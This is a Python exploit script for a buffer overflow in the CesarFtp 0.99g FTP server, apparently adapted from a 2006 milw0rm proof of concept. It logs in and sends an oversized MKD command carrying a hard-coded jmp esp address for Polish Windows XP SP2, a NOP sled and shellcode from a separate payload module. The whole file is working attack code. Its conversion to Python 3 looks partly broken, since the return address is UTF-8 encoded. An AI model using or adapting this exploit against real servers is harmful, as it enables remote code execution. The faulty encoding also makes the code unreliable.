#!/usr/bin/python
#CesarFtp 0.99g 0day Exploit
#Proof of Concept: execute calc.exe
#Tested on XP sp2 polish
#Bug found by h07 [h07@interia.pl]
#Date: 10.06.2006
from payload import buf
import socket
def intel_order(i):
    a = chr(i % 256)
    i = i >> 8
    b = chr(i % 256)
    i = i >> 8
    c = chr(i % 256)
    i = i >> 8
    d = chr(i % 256)
    str = "%c%c%c%c" % (a, b, c, d)
    return str
def shell_attack(target_machine, target_port):


    

  

    host = target_machine
    port = target_port
    user = b"h07"
    password = b"open"
    EIP = 0x7CA58265 #jmp esp <shell32.dll XP sp2 polish>

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    

    s.send(b"user %s\r\n" % (user))
   

    s.send(b"pass %s\r\n" % (password))
    value = intel_order(EIP)
    value = bytes(value, 'utf-8')
    buffer = b"MKD "
    buffer += b"\n" * 671
    buffer += b"A" * 3 + value
    buffer += b"\x90" * 40 + buf
    buffer += b"\r\n"

   

    s.send(buffer)
  

    s.close()

    #EoF 

    # milw0rm.com [2006-06-12]